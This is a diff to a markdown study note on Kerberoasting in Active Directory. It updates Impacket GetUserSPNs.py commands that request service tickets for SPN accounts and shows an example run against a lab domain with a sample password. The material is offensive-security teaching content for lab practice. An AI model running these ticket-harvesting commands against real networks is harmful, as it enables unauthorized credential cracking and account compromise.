@@ -1,3 +1,5 @@
+#AD_Kerberoast
+
 
 **Kerberoasting targets service accounts that have an SPN (a service identifier).**
 - When a user asks to access a service, they receive a **Service Ticket (ST)**
@@ -43,12 +45,11 @@ in this case there're two vulnerable users: 'kerberoasting' and 'angel'.
 # 3.  **Request All TGS Ticket**
 
 ```bash
-
 # **Request All TGS Tickets (for all SPNs)**
-GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:'<PASSWORD>' -request
 
 # Request Ticket for a Specific Account (Optiona)
-GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME> -request-user <TARGET_ACCOUNT>
+GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USERNAME>:'<PASSWORD>' -request-user <TARGET_ACCOUNT>
 
 #example
 GetUserSPNs.py dev-angelist.lab/devan:'Password123!' -dc-ip corp-dc -request #without specifing a user it checks all possible tickets
